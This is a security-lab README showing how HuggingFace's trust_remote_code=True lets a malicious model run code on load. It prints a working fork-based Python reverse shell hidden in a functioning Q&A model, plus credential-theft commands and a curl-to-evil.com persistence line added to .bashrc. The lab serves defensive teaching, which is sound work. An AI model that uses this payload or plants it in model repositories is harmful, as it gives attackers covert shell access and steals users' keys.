# Lab 06: HuggingFace Supply Chain Attack (Reverse Shell)

## 🎯 Overview

This lab demonstrates how **`trust_remote_code=True`** in HuggingFace's `transformers` library can lead to **complete system compromise**. When a victim loads a malicious model, hidden Python code executes automatically—spawning a **reverse shell** that gives the attacker full interactive access to the victim's machine.

> **Impact**: The attacker gains the same access as if they were sitting at the victim's terminal—they can steal credentials, browse files, install backdoors, and pivot to other systems.

---

## 🔥 The Vulnerability

```python
# ⚠️ DANGEROUS - This executes arbitrary Python from the model repo!
from transformers import AutoModel

model = AutoModel.from_pretrained(
    "malicious-org/helpful-model",
    trust_remote_code=True  # 💀 Game over
)
```

When `trust_remote_code=True` is set:
1. HuggingFace reads `config.json` from the model directory
2. Finds `auto_map` pointing to custom Python file
3. **Imports and executes** that Python file
4. Any code in the file runs with full user privileges

---

## 📁 Lab Structure

```
lab-06-supply-chain-attack/
├── 1_attacker_listener.py        # Attacker's reverse shell listener
├── 2_victim_loads_model.py       # Victim's "innocent" Q&A chatbot
├── malicious_model/              # Fake HuggingFace model
│   ├── config.json               # Points to malicious code
│   └── reverse_shell_payload.py  # Hidden reverse shell + Q&A model
├── .env                          # Configuration (host/port)
├── .env.example                  # Example configuration
├── requirements.txt
├── reset.py
└── README.md
```

---

## 🔄 Attack Flow

```
┌─────────────────────────────┐         ┌─────────────────────────────┐
│      ATTACKER MACHINE       │         │       VICTIM MACHINE        │
│      (127.0.0.1)          │         │      (10.165.28.139)        │
│                             │         │                             │
│  1. Start listener          │         │  2. Load "helpful" model    │
│     python 1_attacker_...   │◄────────│     trust_remote_code=True  │
│                             │ Reverse │                             │
│  3. Receive shell! 🎉       │  Shell  │  Sees: Working Q&A chatbot  │
│     Full access to victim   │ Connect │  No idea shell is active    │
│                             │         │                             │
│  4. Run commands:           │         │  5. Victim asks questions:  │
│     $ pwd → /home/victim    │         │     "What is AI?" → answer  │
│     $ cat ~/.ssh/id_rsa     │         │     (model actually works!) │
└─────────────────────────────┘         └─────────────────────────────┘
```

---

## ⚡ Quick Start

### Prerequisites

- Python 3.8+
- Linux/macOS (uses `fork()` and `pty`)
- **Two machines** (or two terminals for local demo)

### Setup

**On both machines:**

```bash
cd lab-06-supply-chain-attack
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Configuration

Copy and edit the environment file:

```bash
cp .env.example .env
```

Edit `.env` to set attacker's IP:

```dotenv
# Attacker Configuration
ATTACKER_HOST=127.0.0.1    # Attacker's IP address
ATTACKER_PORT=4444           # Port for reverse shell
```

---

## 🎬 Running the Demo

### Step 1: Open Firewall (Attacker Machine)

```bash
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
```

### Step 2: Start Attacker Listener

**On attacker machine (127.0.0.1):**

```bash
cd lab-06-supply-chain-attack
source venv/bin/activate
python 1_attacker_listener.py
```

You'll see:
```
🏴‍☠️ ATTACKER'S REVERSE SHELL LISTENER
Listening on 127.0.0.1:4444...
```

### Step 3: Run Victim Script

**On victim machine (10.165.28.139):**

```bash
cd labs  # Run from parent directory to show different pwd
source lab-06-supply-chain-attack/venv/bin/activate
python lab-06-supply-chain-attack/2_victim_loads_model.py
```

Victim sees a working Q&A chatbot:
```
==================================================
  Simple Q&A Model - HuggingFace Demo
==================================================

Loading model: helpful-ai/super-fast-bert
Model loaded successfully!

You: What is AI?
Bot: AI (disambiguation) AI may refer to...

You: What is 2 + 2?
Bot: 4
```

### Step 4: Attacker Has Shell! 🎉

**Back on attacker's terminal:**

```
🚨 SHELL CONNECTED! Victim: 10.165.28.139:54321

$ pwd
/home/victim/labs          # ← Victim's directory!

$ whoami
victim

$ cat ~/.aws/credentials
[default]
aws_access_key_id = AKIA...
```

---

## 🔍 How It Works

### 1. The Malicious `config.json`

```json
{
  "auto_map": {
    "AutoModel": "reverse_shell_payload.BackdooredModel"
  }
}
```

### 2. The Payload (`reverse_shell_payload.py`)

```python
import os, socket, pty

def _spawn_shell():
    pid = os.fork()  # Fork: child = shell, parent = normal
    
    if pid == 0:  # Child process
        sock = socket.socket()
        sock.connect(("127.0.0.1", 4444))
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr
        pty.spawn("/bin/bash")
        os._exit(0)
    
    # Parent continues normally - victim sees working chatbot!

_spawn_shell()  # Executes on import!

class BackdooredModel:
    # Real Q&A model using flan-t5-small
    # Victim gets actual answers while attacker has shell
```

### 3. Why `os.fork()` is Critical

| Without Fork | With Fork |
|-------------|-----------|
| Shell hijacks victim's terminal | Shell runs in background process |
| Victim immediately notices | Victim sees normal chatbot |
| Attack is obvious | Attack is completely hidden |

---

## 💀 What Attackers Can Do

Once connected, the attacker has **full shell access**:

```bash
# Steal credentials
cat ~/.aws/credentials
cat ~/.ssh/id_rsa
cat ~/.config/gh/hosts.yml

# Find API keys
env | grep -i key
grep -r "API_KEY" ~/projects/

# Browse files
ls -la ~/
find ~ -name "*.env" 2>/dev/null

# Persistent access
echo 'curl http://evil.com/backdoor.sh | bash' >> ~/.bashrc
```

---

## 🛡️ Defenses

| Defense | How It Helps |
|---------|--------------|
| **Never use `trust_remote_code=True`** | Blocks all custom code execution |
| **Use SafeTensors format** | Binary format, cannot contain code |
| **Pin model revisions** | `revision="abc123"` prevents silent updates |
| **Audit model code** | Review `.py` files before loading |
| **Use containers** | Sandbox isolates damage |
| **Network segmentation** | Block outbound connections |

### Safe Loading Example

```python
from transformers import AutoModel

# ✅ SAFE - Only loads weights, no code execution
model = AutoModel.from_pretrained(
    "bert-base-uncased",
    trust_remote_code=False,  # Default and safe!
    use_safetensors=True      # Binary format only
)
```

---

## 📊 Risk Assessment

| Factor | Rating | Notes |
|--------|--------|-------|
| **Exploitability** | 🔴 Easy | Single flag enables attack |
| **Impact** | 🔴 Critical | Full system compromise |
| **Detection** | 🔴 Hard | Victim sees working chatbot |
| **Prevalence** | 🟡 Medium | Common in tutorials & notebooks |

---

## 🧹 Reset Lab

```bash
python reset.py
```

This kills any lingering listeners and cleans up temp files.

---

## 📚 References

- [HuggingFace Custom Models](https://huggingface.co/docs/transformers/custom_models)
- [SafeTensors Format](https://huggingface.co/docs/safetensors)
- [OWASP ML Security Top 10](https://owasp.org/www-project-machine-learning-security-top-10/)

---

## ⚠️ Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY.** This lab demonstrates security vulnerabilities to help defenders understand and mitigate risks. Do not use these techniques maliciously.
